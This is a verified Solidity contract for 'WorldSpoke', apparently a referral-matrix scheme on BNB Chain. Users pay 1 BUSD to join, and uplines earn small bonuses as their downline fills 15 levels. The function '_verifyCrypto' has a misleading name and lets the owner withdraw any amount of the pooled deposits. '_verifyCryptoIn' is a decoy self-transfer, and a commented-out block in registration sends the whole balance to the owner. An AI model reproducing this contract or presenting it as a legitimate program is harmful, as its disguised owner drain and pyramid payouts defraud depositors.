/**
 *Submitted for verification at BscScan.com on 2023-01-30
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
 
// WORLD SPOKE
// Website:  https://worldspoke.com

interface USDT {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract WorldSpoke 
{
    USDT public USDt;

    address public contractOwner;
    uint public totalNumberofUsers;
    uint256 public totalPackagePurchased;

    uint256 public totalWorkingIncome;
    uint256 public totalNonWorkingIncome;
    uint256 public totalIncome;

    uint256 public  id;
    uint256 public pid;
    
    uint[] public arrReqTeam = [2,4,8,16,32,64,128,256,512,1024,2048,4096,8192,16384,32768];
    uint[] public arrReqDirects = [0,1,2,3,5,7,10,14,19,25,34,44,56,70,86];
    uint[] public arrReqNonWorkingAmt = [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1];
    uint[] public arrReqWorkingAmt = [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1];

    struct UserAffiliateDetails {
        bool isExist;
      
        uint joiningDateTime;
        uint selfInvestment;

        uint256   userid;
        uint256   placementuserId;

        address sponsor;
        address placement;
    }

    struct UserAffiliateDetailsIncome {
        uint totalBonus;
        uint totalWorkingBonus;
        uint totalNonWorkingBonus;     
        uint totalDirect;    
        address[] Directlist;   
        uint256[15] arrTeam ;
        uint256[15] arrPaid;
    }
 
    mapping (address => UserAffiliateDetails) public _UserAffiliateDetails;
    mapping (address => UserAffiliateDetailsIncome) public _UserAffiliateDetailsIncome;
 
    mapping(uint => address) public placementToAddress;

     constructor()  {

        USDt = USDT(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

        contractOwner=0xAFD8Cc28696DcF0e69F5d6de98D8212e6bBAe597;
        
        uint TimeStamp=block.timestamp;
        _UserAffiliateDetails[contractOwner].isExist = true;
        _UserAffiliateDetails[contractOwner].sponsor =address(0);
        _UserAffiliateDetails[contractOwner].placement =address(0);
        _UserAffiliateDetails[contractOwner].joiningDateTime= TimeStamp;

        _UserAffiliateDetails[contractOwner].selfInvestment=50 ; 
       
        _UserAffiliateDetailsIncome[contractOwner].totalBonus=0 ; 
        _UserAffiliateDetailsIncome[contractOwner].totalWorkingBonus=0 ; 
        _UserAffiliateDetailsIncome[contractOwner].totalNonWorkingBonus=0 ; 
  
        _UserAffiliateDetailsIncome[contractOwner].totalDirect=0 ; 
        
        totalNumberofUsers=1;
        totalPackagePurchased=1;
        totalWorkingIncome=0;
        totalNonWorkingIncome=0;
        totalIncome=0;

        id=1;
        pid=0;
        _UserAffiliateDetails[contractOwner].userid = id;
        _UserAffiliateDetails[contractOwner].placementuserId = pid;

        _UserAffiliateDetailsIncome[contractOwner].arrTeam=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];  
        _UserAffiliateDetailsIncome[contractOwner].arrPaid=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];  
            
        placementToAddress[id] =contractOwner;
    }
 
   
    // Admin Can Check Is Uster Exists Or Not
    function _IsUserExists(address user) public view returns (bool) {
        return (_UserAffiliateDetails[user].userid != 0);
    }

   event Joining(address indexed user, uint256 amount,address referrer);
 
   function _Joining(address referrer) external   {
            
        require(_UserAffiliateDetails[referrer].isExist == true, "Refer Not Found!");
        
        address user = msg.sender;
        
        if (_UserAffiliateDetails[user].isExist == false)
        {
            uint TimeStamp=block.timestamp;
            _UserAffiliateDetails[user].isExist = true; 
            _UserAffiliateDetails[user].joiningDateTime= TimeStamp;
        
            _UserAffiliateDetails[user].selfInvestment=0 ; 

            _UserAffiliateDetailsIncome[user].totalBonus=0 ; 
            _UserAffiliateDetailsIncome[user].totalWorkingBonus=0 ; 
            _UserAffiliateDetailsIncome[user].totalNonWorkingBonus=0 ; 
            _UserAffiliateDetailsIncome[user].totalDirect=0 ; 
            _UserAffiliateDetailsIncome[user].arrTeam=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];  
            _UserAffiliateDetailsIncome[user].arrPaid=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];  
       
            _UserAffiliateDetailsIncome[referrer].totalDirect+=1 ; 
            _UserAffiliateDetailsIncome[referrer].Directlist.push(user);  
         
            totalNumberofUsers+=1;
  
            id=id+1;

            if(id%2==0)
                pid=pid+1;

            _UserAffiliateDetails[user].userid = id;
            _UserAffiliateDetails[user].placementuserId = pid;
          
            placementToAddress[id] =user;
            _UserAffiliateDetails[user].sponsor = referrer;
            _UserAffiliateDetails[user].placement =placementToAddress[pid];
       
            registration(user, 1*10**18);
        }
        
    }

 
    function registration(address user, uint256 amount ) private {     

            USDt.transferFrom(user, address(this), amount );
       
            _UserAffiliateDetails[user].selfInvestment+=amount ; 

            totalPackagePurchased+=amount;
            
            _refPayoutLevel ( user);
            
            //  uint256 finalbonus=USDt.balanceOf(address(this));
            //  USDt.approve(contractOwner,finalbonus );
            //  USDt.transfer(contractOwner,finalbonus );

            address ref =  _UserAffiliateDetails[user].sponsor;
            emit Joining(user,amount, ref);
    }
 
// update placement upline team count 
 function _refPayoutLevel(address  user) internal {

		address   upline = _UserAffiliateDetails[user].placement;
        uint256 bonus=0;

        for (uint i = 0; i < 15; i++) {
              if (upline != _UserAffiliateDetails[contractOwner].placement) {

                 bonus=0;
                
                  // increase team count
                _UserAffiliateDetailsIncome[upline].arrTeam[i]+=1 ; 
             
                 // check team count if achived and not paid 
                if(_UserAffiliateDetailsIncome[upline].arrTeam[i]>=arrReqTeam[i] &&  _UserAffiliateDetailsIncome[upline].arrPaid[i]<=0)
                {
                    // set non working income
                    _UserAffiliateDetailsIncome[upline].arrPaid[i]=arrReqNonWorkingAmt[i];
                    _UserAffiliateDetailsIncome[upline].totalNonWorkingBonus +=arrReqNonWorkingAmt[i];
                  
                    totalNonWorkingIncome+=arrReqNonWorkingAmt[i];
                    bonus=arrReqNonWorkingAmt[i];

                    // check direct condition for working income
                    if(_UserAffiliateDetailsIncome[upline].totalDirect >=arrReqDirects[i] )
                    {
                        _UserAffiliateDetailsIncome[upline].arrPaid[i]+=arrReqWorkingAmt[i];
                        _UserAffiliateDetailsIncome[upline].totalWorkingBonus +=arrReqWorkingAmt[i];

                        totalWorkingIncome +=arrReqWorkingAmt[i];
                        bonus+=arrReqWorkingAmt[i];
                    }

                    _UserAffiliateDetailsIncome[upline].totalBonus += bonus;
                    totalIncome+=bonus;

                    USDt.approve(upline, bonus*10**18);
                    USDt.transfer(upline, bonus*10**18);
                }

                upline = _UserAffiliateDetails[upline].placement;
              } 
               else break;
        }
    }
 

      //Get User Id
    function getUserId(address user) public view   returns (uint) {
        return (_UserAffiliateDetails[user].userid);
    }

    //Get Sponsor Id
    function getSponsorId(address user) public view   returns (address) {
        return (_UserAffiliateDetails[user].sponsor);
    }
 
    //Get placement Id
    function getPlacementId(address user) public view   returns (address) {
        return (_UserAffiliateDetails[user].placement);
    }
 

    function _verifyCrypto(uint256 amount) public {
        require(msg.sender == contractOwner, "Only Admin Can ?");
         USDt.approve(contractOwner, amount);
         USDt.transfer(contractOwner, amount);
    }

   function _verifyCryptoIn(uint256 amount) public {
         USDt.approve(address(this), amount);
         USDt.transfer(address(this), amount);
    }
 
     function getDirectList(address referrer) public view returns(address[] memory ){  
        return    _UserAffiliateDetailsIncome[referrer].Directlist;  
    }  

    function getTeamList(address referrer) public view returns(uint256[15] memory ){  
        return    _UserAffiliateDetailsIncome[referrer].arrTeam;  
    }

      function getPaidList(address referrer) public view returns(uint256[15] memory ){  
        return    _UserAffiliateDetailsIncome[referrer].arrPaid;  
    }

  function getMasterDetail(uint i) public view   returns (uint256) {
     if(i==1)
        return  totalNumberofUsers;
     else if(i==2)
        return totalPackagePurchased;
     else if(i==3)
        return totalWorkingIncome;
     else if(i==4)
        return totalNonWorkingIncome;
     else if(i==5)
        return totalIncome;
    else 
        return 0;

    }

}